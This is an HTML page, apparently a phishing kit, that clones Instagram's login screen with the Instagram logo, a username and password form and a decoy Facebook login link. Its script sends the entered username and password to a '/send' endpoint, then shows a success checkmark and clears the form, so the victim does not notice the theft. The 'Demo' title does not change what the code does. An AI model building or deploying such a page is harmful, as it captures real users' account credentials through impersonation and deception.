<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login Demo</title>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<link rel="stylesheet" href="style.css">

<style>
/* ===== Extra Styles for Responsive Checkmark & Status ===== */
.insta-logo img, .success-logo img {
    width: 100px; /* bir xil o'lcham */
    height: 100px;
    display: block;
    margin: 0 auto 20px auto;
    transition: transform 0.6s ease, opacity 0.6s ease;
    backface-visibility: hidden;
}

.success-logo {
    display: none;
    text-align: center;
}

/* 3D aylanish container */
.logo-container {
    perspective: 800px;
    width: 100px;
    height: 100px;
    margin: 0 auto 20px auto;
    position: relative;
}

/* Front va back logolar */
.logo-container img {
    position: absolute;
    width: 100px;
    height: 100px;
    border-radius: 20px;
    top:0; left:0;
    backface-visibility: hidden;
    transition: transform 0.8s ease-in-out, opacity 0.8s ease-in-out;
}

#insta-img { z-index:2; }
#checkmark-img { z-index:1; opacity:0; }

/* aylanish animatsiyasi */
@keyframes spin3D {
    from { transform: rotateY(0deg); }
    to { transform: rotateY(360deg); }
}

/* Mobile adjustments */
@media (max-width: 400px) {
    .insta-logo img, .success-logo img, .logo-container img {
        width: 60px;
        height: 60px;
    }

    input, button { padding: 10px 8px; font-size: 14px; }
    .status { font-size: 13px; }
}
</style>

</head>
<body>

<div class="container">
    <div class="login-box">
        <!-- 3D logo container -->
        <div class="logo-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram Logo" id="insta-img">
            <img src="https://cdn3d.iconscout.com/3d/premium/thumb/galochka-3d-icon-png-download-11169918.png" alt="Verified" id="checkmark-img">
        </div>

        <form id="form">
            <input type="text" id="username" placeholder="Mobile number, username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>

        <div class="divider">OR</div>
        <div class="fb-login"><i class="fa-brands fa-facebook-square"></i> Log in with Facebook</div>
        <p class="status" id="status"></p>
    </div>

    <div class="signup-box">
        Don't have an account? <a href="#">Sign up</a>
    </div>
</div>

<script>
const form = document.getElementById("form");
const status = document.getElementById("status");
const logoContainer = document.querySelector(".logo-container");
const instaImg = document.getElementById("insta-img");
const checkImg = document.getElementById("checkmark-img");

form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;

    // 3D aylanish animatsiyasi
    logoContainer.style.animation = "spin3D 0.8s ease-in-out forwards";

    try {
        const response = await fetch("/send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username, password })
        });

        if(response.ok){
            // 0.8s oxirida logolarni almashish
            setTimeout(() => {
                instaImg.style.opacity = 0;
                checkImg.style.opacity = 1;

                logoContainer.style.animation = ""; // animatsiyani to‘xtatish
                form.reset();
            }, 800);
        } else {
            status.style.color = "red";
            status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
            logoContainer.style.animation = "";
        }
    } catch(err){
        console.error(err);
        status.style.color = "red";
        status.textContent = "❌ Server bilan bog‘lanib bo‘lmadi";
        logoContainer.style.animation = "";
    }
});
</script>

</body>
</html>
